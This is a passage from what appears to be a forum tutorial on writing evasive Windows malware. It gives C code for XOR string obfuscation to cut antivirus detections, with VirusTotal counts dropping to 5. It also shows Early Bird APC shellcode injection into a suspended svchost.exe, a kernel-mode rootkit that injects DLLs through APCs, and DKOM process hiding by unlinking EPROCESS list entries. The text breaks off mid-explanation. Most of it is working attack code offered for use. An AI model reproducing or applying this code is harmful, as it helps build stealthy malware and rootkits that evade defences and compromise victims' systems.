<p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/e/5/e50d29c626da3ccb333952fe7f45f1f0b939f1a8.png" data-download-href="/uploads/short-url/wGhxEciBeqiwVyYKqZTzj2xU4lO.png?dl=1" title="AAA" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/e/5/e50d29c626da3ccb333952fe7f45f1f0b939f1a8_2_690x189.png" alt="AAA" data-base62-sha1="wGhxEciBeqiwVyYKqZTzj2xU4lO" width="690" height="189" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/e/5/e50d29c626da3ccb333952fe7f45f1f0b939f1a8_2_690x189.png, https://0x00sec.s3.amazonaws.com/original/3X/e/5/e50d29c626da3ccb333952fe7f45f1f0b939f1a8.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/e/5/e50d29c626da3ccb333952fe7f45f1f0b939f1a8.png 2x" data-dominant-color="F9F7F7"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">AAA</span><span class="informations">854√ó234 25.5 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Like I said msf shellcode is a give away but let‚Äôs Try something else. Time to dust off some classic techniques that never go out of style. We‚Äôre diving into XOR encryption, a method you‚Äôre probably familiar with when it comes to encrypting shellcode. When XOR encryption is put to work on shellcode, a key is carefully selected to XOR every byte of the shellcode. To decrypt the shellcode, you simply employ the same key to XOR each byte once more, effectively reversing the encryption process and restoring the original shellcode. However, it‚Äôs worth noting that XOR encryption can be a walk in the park for attackers who know the key. If you‚Äôre up for a challenge, check out the one I posted a while back <a href="../reverseme-cipher/index.html">ReverseMeCipher</a> which involves XOR encryption. Here‚Äôs a writeup to give you some insights <a href="https://0xf00i.github.io/2023/06/12/ReverseMe-Writeup.html" rel="noopener nofollow ugc">CipherWriteup</a> As a general rule, it‚Äôs often smarter to combine XOR encryption with other methods.</p>
<p>So first we wanna remove strings and debug symbols, Running the command <code>strings</code> on our exe reveals strings such as ‚ÄúNtCreateThreadEx‚Äù, which may lead to AV detection.</p>
<p>We can remove these strings by again XOR encrypting them and decrypting during runtime, First we start by the function responsible for encryption and decryption</p>
<pre><code class="lang-c">unsigned char * rox(unsigned char *, int, int);
unsigned char * rox(unsigned char * data, int dataLen, int xor_key)
{
    unsigned char * output = (unsigned char *)malloc(sizeof(unsigned char) * dataLen + 1);

    for (int i = 0; i &lt; dataLen; i++)
        output[i] = data[i] ^ xor_key;

    return output;
}
</code></pre>
<p>This Function can be used for encryption and also be used for decryption by applying the same XOR operation. If you XOR the encrypted data with the same <code>xor_key</code>, it will revert to the original data, just formats encrypted shellcode nicely so we can copy and paste, and we only need the encrypt function in our actual injector.</p>
<pre><code class="lang-c">const char* ntdll_str = (const char*)ntdll;
const char* navm_str = (const char*)navm;
const char* nwvm_str = (const char*)nwvm;
const char* ncte_str = (const char*)ncte;
</code></pre>
<p>So like we said NtCreateThreadEx." These strings can be indicative of the program‚Äôs functionality and may lead to antivirus (AV), One way to obfuscate these strings and make them less detectable is to XOR encrypt them, and then decrypt them during runtime when they are needed.</p>
<p>For example:</p>
<pre><code class="lang-c">unsigned char ntdll_data[] = {0x3d, 0x27, 0x37, 0x3f, 0x3f, 0x7d, 0x37, 0x3f, 0x3f, 0x53};
unsigned char *ntdll = rox(ntdll_data, 10, 0x53);
</code></pre>
<p>Let‚Äôs use <a href="https://www.virustotal.com/" rel="noopener nofollow ugc">Virustotal</a> again and check the detection rate.</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/f/cf085c44554465665747437a6dd927da65f13969.png" data-download-href="/uploads/short-url/txuKpdmUR8SvwXRgZT5T5uYfxj3.png?dl=1" title="BBB" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/f/cf085c44554465665747437a6dd927da65f13969_2_690x179.png" alt="BBB" data-base62-sha1="txuKpdmUR8SvwXRgZT5T5uYfxj3" width="690" height="179" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/f/cf085c44554465665747437a6dd927da65f13969_2_690x179.png, https://0x00sec.s3.amazonaws.com/original/3X/c/f/cf085c44554465665747437a6dd927da65f13969.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/f/cf085c44554465665747437a6dd927da65f13969.png 2x" data-dominant-color="F9F7F8"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">BBB</span><span class="informations">861√ó224 24.5 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Well, going from 27 detections down to 9 is indeed a notable improvement, but it‚Äôs essential to recognize that this level of evasion is still relatively basic, especially when relying on tools like <code>msfvenom</code> to achieve our goals.</p>
<p>Alright time for a new code Injection Technique ‚ÄúEarly Bird‚Äù This Was used by group goes by APT33 How this works Simply it takes advantage of the application threading process that happens when a program executes on a computer. In other words, attackers inject malware code into legitimate process threads in an effort to hide malicious code inside commonly seen and legitimate processes.</p>
<p>We gone use functions like <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>QueueUserAPC</code>, <code>CreateProcessW</code>, and <code>ResumeThread</code> By this time Before injecting the shellcode we a employs an AES decryption routine, The decryption process uses the Cryptography API (CryptAcquireContextW) functions to decrypt the payload using a predefined key.</p>
<pre><code class="lang-c">int AESDecrypt(unsigned char* payload, DWORD payload_len, char* key, size_t keylen) {

HCRYPTPROV hProv;
HCRYPTHASH hHash;
HCRYPTKEY hKey;

BOOL CryptAcquire = CryptAcquireContextW(&amp;hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
if (CryptAcquire == false) {
//printf("CryptAcquireContextW Failed: %d\n", GetLastError());
return -1;
}

BOOL CryptCreate = CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &amp;hHash);
if (CryptCreate == false) {
//printf("CryptCreateHash Failed: %d\n", GetLastError());
return -1;
}

  
BOOL CryptHash = CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
if (CryptHash == false) {
//printf("CryptHashData Failed: %d\n", GetLastError());
return -1;
}

  

BOOL CryptDerive = CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &amp;hKey);
if (CryptDerive == false) {
//printf("CryptDeriveKey Failed: %d\n", GetLastError());
return -1;
}

  

BOOL Crypt_Decrypt = CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &amp;payload_len);
if (Crypt_Decrypt == false) {
//printf("CryptDecrypt Failed: %d\n", GetLastError());
return -1;
}

  

CryptReleaseContext(hProv, 0);
CryptDestroyHash(hHash);
CryptDestroyKey(hKey);

return 0;
}
</code></pre>
<p>The AES decryption routine ensures that the injected shellcode is in its original, unencrypted form, which is essential for executing it within the target process. This decryption process allows attackers to conceal the true nature of their payload until it is actively executed in the target process‚Äôs thread.</p>
<p>Next <code>CreateProcessW</code></p>
<pre><code class="lang-c">pfnCreateProcessW pCreateProcessW = (pfnCreateProcessW)GetProcAddress(GetModuleHandleW(L"KERNEL32.DLL"), "CreateProcessW");
if (pCreateProcessW == NULL) {
    // Handle error if the function cannot be found
}

STARTUPINFOW si;
PROCESS_INFORMATION pi;

// Clear out startup and process info structures
RtlSecureZeroMemory(&amp;si, sizeof(si));
si.cb = sizeof(si;
RtlSecureZeroMemory(&amp;pi, sizeof(pi));

std::wstring pName = L"C:\\Windows\\System32\\svchost.exe";

HANDLE pHandle = NULL;
HANDLE hThread = NULL;
DWORD Pid = 0;

BOOL cProcess = pCreateProcessW(NULL, &amp;pName[0], NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi);

</code></pre>
<p>The <code>CreateProcessW</code> function is invoked to create a new process, which, in this case, is intended to execute the <code>svchost.exe</code> application. However, a critical parameter here is <code>CREATE_SUSPENDED</code>, which is set to <code>TRUE</code>, After successfully creating the suspended process, the code retrieves the process and thread handles. These handles are crucial for further manipulation of the newly created process.</p>
<pre><code class="lang-auto">pHandle = pi.hProcess;
hThread = pi.hThread;
Pid = pi.dwProcessId;
</code></pre>
<p>With the suspended process and its associated handles in place, now we ready to proceed with the code injection, which involves injecting shellcode into the memory space of the newly created process.</p>
<p>Creating a suspended process provides an ideal opportunity to inject code and manipulate the process without raising immediate suspicion.</p>
<p>In the next steps, we will proceed to inject the shellcode into the suspended process, ultimately leading to its execution within the context of the target process‚Äôs thread, However Before injecting the shellcode, memory space is allocated within the target process to accommodate the injected code. This allocation is done using the <code>VirtualAllocEx</code> function.</p>
<pre><code class="lang-c">LPVOID memAlloc = pVirtualAllocEx(pHandle, 0, scSize, MEM_COMMIT, PAGE_EXECUTE_READ);
</code></pre>
<p>The shellcode, which was previously decrypted, is now written into the allocated memory space within the target process using the <code>WriteProcessMemory</code> function.</p>
<pre><code class="lang-cpp">DWORD wMem = pWriteProcessMemory(pHandle, (LPVOID)memAlloc, shellcode, scSize, &amp;bytesWritten);
</code></pre>
<p>With the shellcode successfully injected into the target process‚Äôs memory, the code prepares for its execution. This is done using the <code>QueueUserAPC</code> function, which enqueues the shellcode for execution within the context of a specific thread within the target process.</p>
<pre><code class="lang-c">if (pQueueUserAPC((PAPCFUNC)memAlloc, hThread, NULL)) {
    pResumeThread(hThread);
}
</code></pre>
<p>Now, let‚Äôs verify the success of our concealment strategy by injecting the shellcode into a suspended process and manipulating the memory space within the context of the process‚Äôs thread.</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/d/6d86c980ea7f7e26893e91cd7363036fec189849.png" data-download-href="/uploads/short-url/fCUP6PNVSZF5U2KAGq0ym7rxtmV.png?dl=1" title="CCC" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/d/6d86c980ea7f7e26893e91cd7363036fec189849_2_690x169.png" alt="CCC" data-base62-sha1="fCUP6PNVSZF5U2KAGq0ym7rxtmV" width="690" height="169" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/d/6d86c980ea7f7e26893e91cd7363036fec189849_2_690x169.png, https://0x00sec.s3.amazonaws.com/original/3X/6/d/6d86c980ea7f7e26893e91cd7363036fec189849.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/6/d/6d86c980ea7f7e26893e91cd7363036fec189849.png 2x" data-dominant-color="F8F7F7"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">CCC</span><span class="informations">861√ó212 24.3 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Among the initial 72 detections, we‚Äôve successfully narrowed it down to a mere 5. We commenced with 27 detections, which subsequently decreased to 9, and now we find ourselves with just 5 remaining, and we can keep it going and I‚Äôm pretty sure we hit that big zero, This overarching perspective emphasizes the importance of having a diverse array of techniques in your arsenal.</p>
<h1><a name="writing-a-simple-rootkit-22" class="anchor" href="37769.html#writing-a-simple-rootkit-22"></a>Writing a simple Rootkit</h1>
<p>Kernel mode rootkits operate at the most privileged level, known as ‚ÄúRing 0,‚Äù in the computer‚Äôs architecture. In contrast, user mode rootkits run at ‚ÄúRing 3,‚Äù which is a lower privilege level.</p>
<p>In order to grasp the workings of kernel mode rootkits, it is essential to have a solid grasp of the basics of Windows device drivers. Essentially, a device driver is a software component responsible for interfacing with hardware and managing Input/Output Request Packets (IRPs).</p>
<h3><a name="writing-a-windows-device-driver-23" class="anchor" href="37769.html#writing-a-windows-device-driver-23"></a>Writing a Windows Device Driver</h3>
<p>Let‚Äôs start by building a basic Windows device driver:</p>
<pre><code class="lang-c">#include "ntddk.h"

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
    DbgPrint("Hello World!");
    return STATUS_SUCCESS;
}

</code></pre>
<p>This simple driver initializes and prints ‚ÄúHello World!‚Äù to the kernel debugger. However, to perform more complex tasks, we need to understand IRPs.</p>
<h2><a name="understanding-io-request-packets-irps-24" class="anchor" href="37769.html#understanding-io-request-packets-irps-24"></a>Understanding I/O Request Packets (IRPs)</h2>
<p>IRPs are data structures used to communicate between user-mode programs and kernel-mode drivers. When a user-mode program, for example, writes data to a file handle, the kernel creates an IRP to manage this operation.</p>
<p>To process IRPs effectively, a driver must define functions for handling them. In the provided code, we set up a basic dispatch function that completes the IRP with a success status. In reality, different functions would handle various IRP types.</p>
<pre><code class="lang-c">NTSTATUS OnStubDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
    Irp-&gt;IoStatus.Status = STATUS_SUCCESS;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}
</code></pre>
<p>The driver sets up major function pointers, such as <code>IRP_MJ_CREATE</code>, <code>IRP_MJ_CLOSE</code>, <code>IRP_MJ_READ</code>, <code>IRP_MJ_WRITE</code>, and <code>IRP_MJ_DEVICE_CONTROL</code>, to handle specific IRP types. In a comprehensive driver, separate functions would handle these major functions.</p>
<h2><a name="creating-a-file-handle-25" class="anchor" href="37769.html#creating-a-file-handle-25"></a>Creating a File Handle</h2>
<p>File handles are essential for user-mode programs to interact with kernel drivers. In Windows, to use a kernel driver from user-mode, the user-mode program must open a file handle to the driver. The driver first registers a named device, and then the user-mode program opens it as if it were a file.</p>
<pre><code class="lang-c">const WCHAR deviceNameBuffer[] = L"\\Device\\MyDevice";
PDEVICE_OBJECT g_RootkitDevice; // Global pointer to our device object

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
    NTSTATUS ntStatus;
    UNICODE_STRING deviceNameUnicodeString;

    RtlInitUnicodeString(&amp;deviceNameUnicodeString, deviceNameBuffer);

    ntStatus = IoCreateDevice(DriverObject, 0, &amp;deviceNameUnicodeString, 0x00001234, 0, TRUE, &amp;g_RootkitDevice);
    // ...
}

</code></pre>
<p>This code registers a device named ‚ÄúMyDevice.‚Äù A user-mode program can open this device using a fully qualified path, e.g., <code>\\\\Device\\MyDevice</code>. This file handle can be used with functions like <code>ReadFile</code> and <code>WriteFile</code>, which generate IRPs for communication.</p>
<p>Understanding the interaction between user-mode and kernel-mode via IRPs and file handles is fundamental to writing effective Windows device drivers, an essential concept in the realm of kernel mode rootkits.</p>
<p>Remember <strong>DLL Injection</strong>? Now, let‚Äôs take a look at how it‚Äôs employed by rootkits to inject malicious code or custom device drivers directly into the Windows kernel. In the context of the previously discussed device driver and rootkit concepts, we can explore how kernel-mode DLL injection fits into the picture:</p>
<h3><a name="kernel-mode-dll-26" class="anchor" href="37769.html#kernel-mode-dll-26"></a>Kernel-Mode DLL</h3>
<p>The process typically begins with the <code>DriverEntry</code> function, which is the entry point for our driver. Here‚Äôs how we start:</p>
<pre><code class="lang-c">NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverobject, IN PUNICODE_STRING pRegister)
{

NTSTATUS st;
  
PsSetLoadImageNotifyRoutine(&amp;LoadImageNotifyRoutine);

pDriverobject-&gt;DriverUnload = (PDRIVER_UNLOAD)Unload;
  
return STATUS_SUCCESS;
}
</code></pre>
<p>In this code snippet, we employ the <code>PsSetLoadImageNotifyRoutine</code> function to register an image load notification routine. This step is crucial as it allows us to monitor the loading of specific system DLLs, such as <code>kernel32.dll</code>, into the kernel‚Äôs address space.</p>
<p>Additionally, we set the driver‚Äôs unload function (<code>pDriverobject-&gt;DriverUnload</code>) to handle cleanup operations when the driver is unloaded. This ensures that any resources or callbacks registered during the driver‚Äôs lifetime are properly managed.</p>
<h3><a name="image-load-notification-27" class="anchor" href="37769.html#image-load-notification-27"></a>Image Load Notification</h3>
<p>Our monitoring process hinges on image load notifications. We need to identify when the system loads <code>kernel32.dll</code>, a fundamental DLL for Windows operating systems. The <code>LoadImageNotifyRoutine</code> function enables this monitoring.</p>
<pre><code class="lang-c">VOID LoadImageNotifyRoutine(IN PUNICODE_STRING ImageName, IN HANDLE ProcessId, IN PIMAGE_INFO pImageInfo)
{
    if (ImageName != NULL)
    {
        // Check if the loaded image matches the name of kernel32.dll
        WCHAR kernel32Mask[] = L"*\\KERNEL32.DLL";
        UNICODE_STRING kernel32us;
        RtlInitUnicodeString(&amp;kernel32us, kernel32Mask);

        if (FsRtlIsNameInExpression(&amp;kernel32us, ImageName, TRUE, NULL))
        {
            PKAPC Apc;
            
            if (Hash.Kernel32dll == 0)
            {
                // Initialize the Hash structure and import the function addresses
                Hash.Kernel32dll = (PVOID)pImageInfo-&gt;ImageBase;
                Hash.pvLoadLibraryExA = (fnLoadLibraryExA)ResolveDynamicImport(Hash.Kernel32dll, SIRIFEF_LOADLIBRARYEXA_ADDRESS);
            }

            // Create an Asynchronous Procedure Call (APC) to initiate DLL injection
            Apc = (PKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));
            if (Apc)
            {
                KeInitializeApc(Apc, KeGetCurrentThread(), 0, (PKKERNEL_ROUTINE)APCInjectorRoutine, 0, 0, KernelMode, 0);
                KeInsertQueueApc(Apc, 0, 0, IO_NO_INCREMENT);
            }
        }
    }
    return;
}

</code></pre>
<p>The <code>LoadImageNotifyRoutine</code> function plays a pivotal role in our DLL injection process. It checks if the <code>ImageName</code> parameter is not NULL, ensuring that we are actively monitoring loaded images with names. Furthermore, we examine if the loaded image matches the name of <code>kernel32.dll</code>.</p>
<p>If a match is found, we proceed with initializing the <code>Hash</code> structure and creating an Asynchronous Procedure Call (APC) using the <code>APCInjectorRoutine</code>. The APC serves as a mechanism to trigger the DLL injection process into a target process.</p>
<p>These code snippets are instrumental in monitoring and responding to the loading of <code>kernel32.dll</code> and lay the groundwork for our upcoming discussion on kernel-mode DLL injection.</p>
<h3><a name="unloading-the-driver-28" class="anchor" href="37769.html#unloading-the-driver-28"></a>Unloading the Driver</h3>
<p>Before we dive deeper into DLL injection, it‚Äôs essential to understand how the driver can be unloaded properly. We accomplish this using the <code>Unload</code> function.</p>
<pre><code class="lang-c">VOID Unload(IN PDRIVER_OBJECT pDriverobject)
{
    // Remove the image load notification routine
    PsRemoveLoadImageNotifyRoutine(&amp;LoadImageNotifyRoutine);
}
</code></pre>
<p>Here, we use the <code>PsRemoveLoadImageNotifyRoutine</code> function to unregister the previously registered image load notification routine. This step ensures that we can gracefully clean up and stop monitoring loaded images when the driver is unloaded.</p>
<h3><a name="dll-injection-29" class="anchor" href="37769.html#dll-injection-29"></a>DLL Injection</h3>
<p>Our exploration of kernel-mode DLL injection is incomplete without understanding how the actual injection takes place. The <code>DllInject</code> function is the key to achieving this.</p>
<pre><code class="lang-c">NTSTATUS DllInject(HANDLE ProcessId, PEPROCESS Peprocess, PETHREAD Pethread, BOOLEAN Alert)
{
    HANDLE hProcess;
    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
    CLIENT_ID cidprocess = { 0 };
    CHAR DllFormatPath[] = "C:\\foo.dll";
    ULONG Size = strlen(DllFormatPath) + 1;
    PVOID pvMemory = NULL;

    cidprocess.UniqueProcess = ProcessId;
    cidprocess.UniqueThread = 0;

    // Open the target process
    if (NT_SUCCESS(ZwOpenProcess(&amp;hProcess, PROCESS_ALL_ACCESS, &amp;oa, &amp;cidprocess)))
    {
        // Allocate virtual memory in the target process
        if (NT_SUCCESS(ZwAllocateVirtualMemory(hProcess, &amp;pvMemory, 0, &amp;Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
        {
            // Create an APC (Asynchronous Procedure Call) to load the DLL
            KAPC_STATE KasState;
            PKAPC Apc;

            // Attach to the target process
            KeStackAttachProcess(Peprocess, &amp;KasState);

            // Copy the DLL path to the target process's memory
            strcpy(pvMemory, DllFormatPath);

            // Detach from the target process
            KeUnstackDetachProcess(&amp;KasState);

            // Allocate memory for the APC
            Apc = (PKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));
            if (Apc)
            {
                // Initialize the APC with the appropriate routine and parameters
                KeInitializeApc(Apc, Pethread, 0, (PKKERNEL_ROUTINE)APCKernelRoutine, 0, (PKNORMAL_ROUTINE)Hash.pvLoadLibraryExA, UserMode, pvMemory);

                // Insert the APC into the thread's queue
                KeInsertQueueApc(Apc, 0, 0, IO_NO_INCREMENT);
                return STATUS_SUCCESS;
            }
        }
        // Close the target process handle
        ZwClose(hProcess);
    }

    return STATUS_NO_MEMORY;
}

</code></pre>
<p>The <code>DllInject</code> function serves the critical role of injecting a DLL into a target process in kernel mode. It accepts several parameters, including the <code>ProcessId</code> of the target process, the <code>PEPROCESS</code> structure of the target process (<code>Peprocess</code>), the <code>PETHREAD</code> structure of the target process (<code>Pethread</code>), and a Boolean value indicating whether alertable I/O is allowed (<code>Alert</code>).</p>
<p>The injection process begins with the opening of the target process using <code>ZwOpenProcess</code>. This step grants us access to the target process with full privileges.</p>
<p>Subsequently, we allocate virtual memory within the target process using <code>ZwAllocateVirtualMemory</code>. This allocated memory will be used to store the path to the DLL that we intend to inject.</p>
<p>To safely write data into the target process‚Äôs memory, we attach to the target process using <code>KeStackAttachProcess</code>. This attachment is crucial for the integrity and safety of the DLL injection process.</p>
<p>With the attachment in place, we copy the path of the DLL to be injected into the allocated virtual memory within the target process. This path is defined in the <code>DllFormatPath</code> variable.</p>
<p>After successfully copying the DLL path, we detach from the target process using <code>KeUnstackDetachProcess</code>.</p>
<p>The heart of the DLL injection lies in the creation of an Asynchronous Procedure Call (APC). This is accomplished by allocating memory for the APC using <code>ExAllocatePool</code>. The APC is initialized with the necessary routine and parameters.</p>
<ul>
<li>The <code>Apc</code> structure is initialized using <code>KeInitializeApc</code>.</li>
<li>The parameters include the target thread (<code>Pethread</code>) and an APC routine (<code>APCKernelRoutine</code>) responsible for loading the DLL.</li>
<li>Additionally, the normal routine is specified as <code>Hash.pvLoadLibraryExA</code> to load the DLL using <code>LoadLibraryExA</code> from <code>kernel32.dll</code>.</li>
<li>The APC is inserted into the thread‚Äôs queue with <code>KeInsertQueueApc</code>.</li>
</ul>
<p>To ensure that DLL injection occurs in a controlled and synchronized manner, we rely on the <code>SirifefWorkerRoutine</code> and <code>APCInjectorRoutine</code> functions.</p>
<pre><code class="lang-c">VOID SirifefWorkerRoutine(PVOID Context)
{
    DllInject(((PSIRIFEF_INJECTION_DATA)Context)-&gt;ProcessId, ((PSIRIFEF_INJECTION_DATA)Context)-&gt;Process, ((PSIRIFEF_INJECTION_DATA)Context)-&gt;Ethread, FALSE);
    KeSetEvent(&amp;((PSIRIFEF_INJECTION_DATA)Context)-&gt;Event, (KPRIORITY)0, FALSE);
    return;
}
</code></pre>
<p>The <code>SirifefWorkerRoutine</code> function acts as a worker routine responsible for triggering the DLL injection. It accepts a single <code>Context</code> parameter.</p>
<p>Within this function, the actual DLL injection is initiated by calling the <code>DllInject</code> function. The parameters provided include the target process‚Äôs ID, the process‚Äôs <code>EPROCESS</code> structure, and the process‚Äôs <code>ETHREAD</code> structure. The final parameter, <code>FALSE</code>, indicates that alertable I/O is not allowed.</p>
<p>Once the DLL injection process completes, an event (<code>KeSetEvent</code>) is set to signal the successful injection. This event allows us to synchronize the completion of the injection process with other parts of the code.</p>
<h3><a name="dll-injection-via-apc-30" class="anchor" href="37769.html#dll-injection-via-apc-30"></a>DLL Injection via APC</h3>
<p>The initiation of DLL injection takes place within the <code>APCInjectorRoutine</code> function, The <code>APCInjectorRoutine</code> function serves as the orchestrator for our DLL injection process. It commences by initializing a <code>SIRIFEF_INJECTION_DATA</code> structure, <code>Sf</code>, and scheduling a worker thread (<code>SirifefWorkerRoutine</code>) to perform the injection.</p>
<pre><code class="lang-c">VOID NTAPI APCInjectorRoutine(PKAPC Apc, PKNORMAL_ROUTINE *NormalRoutine, PVOID *SystemArgument1, PVOID *SystemArgument2, PVOID* Context)
{
    SIRIFEF_INJECTION_DATA Sf;

    RtlSecureZeroMemory(&amp;Sf, sizeof(SIRIFEF_INJECTION_DATA));
    ExFreePool(Apc);

    // Initialize the SIRIFEF_INJECTION_DATA structure with the necessary information
    Sf.Ethread = KeGetCurrentThread();
    Sf.Process = IoGetCurrentProcess();
    Sf.ProcessId = PsGetCurrentProcessId();

    // Initialize an event to synchronize the DLL injection
    KeInitializeEvent(&amp;Sf.Event, NotificationEvent, FALSE);

    // Initialize a work item to execute the SirifefWorkerRoutine
    ExInitializeWorkItem(&amp;Sf.WorkItem, (PWORKER_THREAD_ROUTINE)SirifefWorkerRoutine, &amp;Sf);

    // Queue the work item to be executed on the DelayedWorkQueue
    ExQueueWorkItem(&amp;Sf.WorkItem, DelayedWorkQueue);

    // Wait for the DLL injection to complete
    KeWaitForSingleObject(&amp;Sf.Event, Executive, KernelMode, TRUE, 0);

    return;
}

</code></pre>
<p>These routines work together to schedule and execute the DLL injection into the target process after the <code>kernel32.dll</code> module is loaded. This injection is performed in a controlled and synchronized manner, ensuring that the target process is injected with the specified.</p>
<h3><a name="hide-process-31" class="anchor" href="37769.html#hide-process-31"></a>Hide Process</h3>
<p>A interesting technique we can use in our rootkit is to hide or unlink a target process, which will be hidden from AVs, We won‚Äôt be able to see this in the Windows Task Manager.</p>
<p>To hide our process we need to understand a few Windows internal concepts, such as the <code>EPROCESS</code> data structure in the Windows kernel. <code>EPROCESS</code> is an opaque data structure in the Windows kernel that contains important information about processes running on the system. The offsets of this large structure change from build to build or version to version.</p>
<p>What we‚Äôre interested in is, <code>ActiveProcessLinks</code>, which is a pointer to a structure called <code>LIST_ENTRY</code>. We can‚Äôt just access this data structure normally like <code>EPROCESS.ActiveProcessLinks</code>, we have to use <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-psgetcurrentprocessid" rel="noopener nofollow ugc">PsGetCurrentProcess</a> to get the current <code>EPROCESS</code> and then add an offset that is version dependent. This is the downside to the <code>EPROCESS</code> structure. It can make it very hard to have a compatible Windows Kernel rootkit.</p>
<pre><code class="lang-auto">kd&gt; dt nt!_EPROCESS
&lt;..redacted...&gt;
    +0x000 Pcb              : _KPROCESS
    +0x3e8 ProcessLock      : _EX_PUSH_LOCK
    +0x2f0 UniqueProcessId  : Ptr64 Void
    +0x400 ActiveProcessLinks : _LIST_ENTRY
</code></pre>
<p>The <code>LIST_ENTRY</code> data structure is a doubly-linked list, where <code>FLINK</code> (forward link) and <code>BLINK</code> are references to the next and previous elements in the doubly-linked list.</p>
<p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/c/ccd2ee6f9d86b1a37e534d272e9834b669bb0616.png" data-download-href="/uploads/short-url/tdXjZgZaIqarhbexg3YcR2oWNM2.png?dl=1" title="img" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/c/c/ccd2ee6f9d86b1a37e534d272e9834b669bb0616.png" alt="img" data-base62-sha1="tdXjZgZaIqarhbexg3YcR2oWNM2" width="690" height="178" data-dominant-color="ECECEC"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use href="#far-image"></use></svg><span class="filename">img</span><span class="informations">841√ó218 3.73 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use href="#discourse-expand"></use></svg></div></a></div></p>
<p>Using the information above, we can hide our process from being shown by manipulating the kernel data structures. To hide our process we can do the following:</p>
<ul>
<li>Point the <code>ActiveProcessLinks.FLINK</code> of <code>EPROCESS 1</code> to <code>ActiveProcessLinks.FLINK</code> of <code>EPROCESS 3</code> .</li>
<li>Point <code>ActiveProcessLinks.BLINK</code> of <code>EPROCESS 3</code> to <code>ActiveProcessLinks.BLINK</code> OF <code>EPROCESS 1</code>.</li>
</ul>
<p>This manipulation unlinks the data structure of our target process, <code>EPROCESS 2</code>, from the doubly-linked list, rendering it invisible to system inspectors.</p>
<pre><code class="lang-c">// Function to hide a process by manipulating kernel data structures
NTSTATUS HideProcess(ULONG pid) {
    PEPROCESS currentEProcess = PsGetCurrentProcess();
    LIST_ENTRY* currentList = &amp;currentEProcess-&gt;ActiveProcessLinks;
    
    // Get the offsets for UniqueProcessId and ActiveProcessLinks
    ULONG uniqueProcessIdOffset = FIELD_OFFSET(EPROCESS, UniqueProcessId);
    ULONG activeProcessLinksOffset = FIELD_OFFSET(EPROCESS, ActiveProcessLinks);
    
    ULONG currentPid;
    
    do {
        // Check if the current process ID is the one to hide
        RtlCopyMemory(&amp;currentPid, (PUCHAR)currentEProcess + uniqueProcessIdOffset, sizeof(currentPid));
        if (currentPid == pid) {
            // Remove the process from the list
            LIST_ENTRY* blink = currentList-&gt;Blink;
            LIST_ENTRY* flink = currentList-&gt;Flink;
            blink-&gt;Flink = flink;
            flink-&gt;Blink = blink;
            return STATUS_SUCCESS;
        }
        
        // Move to the next process
        currentList = currentList-&gt;Flink;
        currentEProcess = CONTAINING_RECORD(currentList, EPROCESS, ActiveProcessLinks);
    } while (currentList != &amp;currentEProcess-&gt;ActiveProcessLinks);
    
    return STATUS_NOT_FOUND;  // Process not found
}
</code></pre>
<p><code>HideProcess</code>, which hides a process using the DKOM technique. It takes the Process ID (PID) of the target process as an argument. Here‚Äôs how it works:</p>
<ol>
<li>It starts by obtaining the current <code>EPROCESS</code> structure for the executing driver using <code>PsGetCurrentProcess</code>.</li>
<li>The code then retrieves the offsets within the <code>EPROCESS</code> structure for <code>UniqueProcessId</code> and <code>ActiveProcessLinks</code>.</li>
